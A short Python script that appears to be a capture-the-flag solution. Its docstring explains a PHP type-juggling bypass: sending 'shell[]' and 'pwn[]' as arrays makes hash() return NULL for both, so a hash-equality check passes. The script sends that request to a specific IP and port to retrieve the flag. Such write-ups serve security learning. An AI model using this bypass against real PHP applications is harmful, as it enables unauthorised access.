import requests

"""
Solution:
By passing in arrays as parameters $_GET['shell'] and $_GET['pwn'] actaully point to arrays. 
Calling hash() on an array returns NULL, no matter what the array contains. (hash() expects a string so I think this is kinda undefined behavior, it throws a warning)
So we can pass the hash() check and by changing the contents of the arrays we can make them different from each other so $_GET['pwn'] !== $_GET['shell'] wull be true. 
Ez flag!
"""

params = {
    "shell[]" : "let me in",
    "pwn[]" : "plz"
}

r = requests.get("http://3.142.122.1:9335/", params=params)
print(r.text[r.text.find("</code>") : ])
